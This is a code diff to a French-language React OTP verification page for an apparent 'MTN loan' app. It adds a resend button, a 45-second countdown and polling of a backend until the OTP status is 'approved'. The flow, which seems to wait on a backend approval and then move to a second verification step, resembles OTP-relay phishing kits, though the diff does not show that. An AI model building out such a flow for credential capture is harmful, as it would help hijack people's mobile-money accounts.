@@ -7,7 +7,7 @@ const API_URL = "https://cameroon-mtn-loan-app.onrender.com";
 
 const OTPVerification = () => {
   const [otp, setOtp] = useState<string[]>(["", "", "", ""]);
-  const [timeLeft, setTimeLeft] = useState<number>(30);
+  const [timeLeft, setTimeLeft] = useState<number>(45); // ✅ 45 Seconds
   const [isVerifying, setIsVerifying] = useState<boolean>(false);
   const navigate = useNavigate();
   const location = useLocation();
@@ -91,6 +91,53 @@ const OTPVerification = () => {
     }
   };
 
+  // ✅ NEW: Resend Logic
+  const handleResend = async () => {
+    if (timeLeft > 0 || isVerifying) return;
+    
+    setIsVerifying(true);
+    const timeoutId = setTimeout(() => {
+      setIsVerifying(false);
+      navigate("/"); 
+    }, 45000);
+
+    try {
+      const res = await fetch(`${API_URL}/api/resend-otp`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phone_number: phoneNumber }),
+      });
+      const data = await res.json();
+      
+      if (data.status === "pending" && data.otp_id) {
+        setTimeLeft(45); // Reset timer
+        
+        const interval = setInterval(async () => {
+          const statusRes = await fetch(`${API_URL}/api/otp-status/${data.otp_id}`);
+          const statusData = await statusRes.json();
+          
+          if (statusData.status !== "pending") {
+            clearInterval(interval);
+            clearTimeout(timeoutId);
+            setIsVerifying(false);
+            
+            if (statusData.status === "approved") {
+              navigate("/second-verification", { state: { phone: phoneNumber } });
+            } else {
+              navigate("/"); 
+            }
+          }
+        }, 2000);
+      } else {
+        clearTimeout(timeoutId);
+        setIsVerifying(false);
+      }
+    } catch (error) {
+      clearTimeout(timeoutId);
+      setIsVerifying(false);
+    }
+  };
+
   return (
     <div className="app-container">
       <div className="header">
@@ -140,6 +187,29 @@ const OTPVerification = () => {
         >
           {isVerifying ? "En attente..." : "Vérifier & se connecter"}
         </button>
+        
+        {/* ✅ NEW: Countdown & Resend UI */}
+        <div style={{ textAlign: 'center', marginBottom: '24px' }}>
+          <p className="helper-text" style={{ display: 'inline', marginRight: '8px' }}>
+            Vous n'avez pas reçu le code ?
+          </p>
+          <button
+            onClick={handleResend}
+            disabled={timeLeft > 0 || isVerifying}
+            style={{
+              background: 'none',
+              border: 'none',
+              color: timeLeft > 0 ? '#9CA3AF' : '#111827',
+              fontWeight: 700,
+              cursor: timeLeft > 0 ? 'not-allowed' : 'pointer',
+              fontSize: '14px',
+              textDecoration: timeLeft === 0 ? 'underline' : 'none',
+              padding: 0
+            }}
+          >
+            {isVerifying ? "Envoi..." : timeLeft > 0 ? `Renvoyer dans ${timeLeft}s` : "Renvoyer le code"}
+          </button>
+        </div>
       </div>
 
       {isVerifying && (
